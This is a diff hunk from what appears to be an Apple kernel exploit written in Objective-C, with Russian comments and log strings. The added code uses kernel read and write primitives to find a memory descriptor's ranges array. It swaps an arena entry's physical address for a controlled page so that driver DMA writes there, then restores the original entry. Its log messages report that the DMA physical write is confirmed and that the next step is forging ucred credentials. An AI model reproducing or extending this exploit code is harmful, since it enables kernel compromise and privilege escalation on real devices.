@@ -6374,6 +6374,46 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         }
         if (!vaFldObj) kpNote(r, [NSString stringWithFormat:@"  [VAD] VA-поле не найдено (пулов=%d, полей проверено=%d, physmap-скип=%d) — следующий шаг: pv_head/второй уровень", npool198, nFld199, nSkipPM]);
     }
+    // 1.9.202: PARENT-RANGES DEPUTY — 126 полей без указателя на буфер: plane-desc
+    // это page-list дескриптор, а его РОДИТЕЛЬ (+0x60) держит ranges-массив арены
+    // (lvl1-дамп: [+0x60]=arr, count=16384) в обычной VMEM-полосе (не physmap!).
+    // Prepare перестраивает sub-MD из родителя — патчим запись арены с нашим
+    // backingPA на ctlPA, и драйвер сам построит PTE. Оригинал вернём после execute.
+    uint64_t parHitArr = 0, parHitOld = 0;
+    uint32_t parHitOff = 0;
+    {
+        uint64_t pd202 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
+        uint64_t parentMD = (kpLooksLikeKernelPointer(pd202) && kpSafeToRead(pd202)) ? kp_untag_ptr(early_kread64(pd202 + 0x60)) : 0;
+        uint64_t arr = 0;
+        uint32_t cnt = 0;
+        if (kpLooksLikeKernelPointer(parentMD) && kpSafeToRead(parentMD)) {
+            arr = kp_untag_ptr(early_kread64(parentMD + 0x60));
+            cnt = (uint32_t)early_kread64(parentMD + 0x68);
+            if (cnt > 0x8000) cnt = 0x8000;
+        }
+        kpNote(r, [NSString stringWithFormat:@"  [PAR] parentMD=%#llx arr=%#llx count=%u", (unsigned long long)parentMD, (unsigned long long)arr, cnt]);
+        if (kpLooksLikeKernelPointer(arr)) {
+            int nDump = 0;
+            for (uint32_t i = 0; i < cnt && !parHitArr; i++) {
+                uint64_t e0 = early_kread64(arr + (uint64_t)i * 16);
+                uint64_t e1 = early_kread64(arr + (uint64_t)i * 16 + 8);
+                if (nDump < 6 && (e0 || e1)) {
+                    kpNote(r, [NSString stringWithFormat:@"    [PAR] [%u]: start=%#018llx len=%#018llx", i, (unsigned long long)e0, (unsigned long long)e1]);
+                    nDump++;
+                }
+                if (e0 == backingPA || (e0 && e1 && backingPA >= e0 && backingPA < e0 + e1)) {
+                    parHitArr = arr; parHitOff = (uint32_t)i * 16; parHitOld = e0;
+                    kpNote(r, [NSString stringWithFormat:@"  [PAR] ★ запись арены [%u]: start=%#018llx len=%#llx — подмена на ctlPA %#llx",
+                              i, (unsigned long long)e0, (unsigned long long)e1, (unsigned long long)ctlPA]);
+                    early_kwrite64(arr + (uint64_t)i * 16, ctlPA);
+                    uint64_t rb5 = early_kread64(arr + (uint64_t)i * 16);
+                    kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb5,
+                              rb5 == ctlPA ? @"ПРИЛИПЛО" : @"МИМО"]);
+                }
+            }
+            if (!parHitArr) kpNote(r, @"  [PAR] записи с backingPA в арене нет — источник глубже (pv_head?)");
+        }
+    }
     // 3. Trusted-path резолв surfVA через M2 async op-entry (1.9.124):
     //    async submit резолвит surface ptr в op-entry БЕЗ execute/снапшота
     //    (раунд 13: DVA-снапшот только при execute). Вся цепочка — из РЕАЛЬНЫХ
@@ -6749,6 +6789,13 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         uint64_t rb4 = early_kread64(vaFldObj + vaFldOff);
         kpNote(r, [NSString stringWithFormat:@"  [VAD] restore VA-поля: %#018llx — %@", (unsigned long long)rb4,
                   rb4 == vaFldOld ? @"вернули оригинал" : @"НЕ вернулось"]);
+    }
+    // 1.9.202: restore записи арены
+    if (parHitArr) {
+        early_kwrite64(parHitArr + parHitOff, parHitOld);
+        uint64_t rb6 = early_kread64(parHitArr + parHitOff);
+        kpNote(r, [NSString stringWithFormat:@"  [PAR] restore записи арены: %#018llx — %@", (unsigned long long)rb6,
+                  rb6 == parHitOld ? @"вернули оригинал" : @"НЕ вернулось"]);
     }
     if (changed) {
         kpNote(r, [NSString stringWithFormat:@"=== PHYSWRITE DMA CONFIRMED: контрольная страница изменена DMA (%u dword) — page-list swap до execute РАБОТАЕТ. Дальше форж ucred ===", changed]);
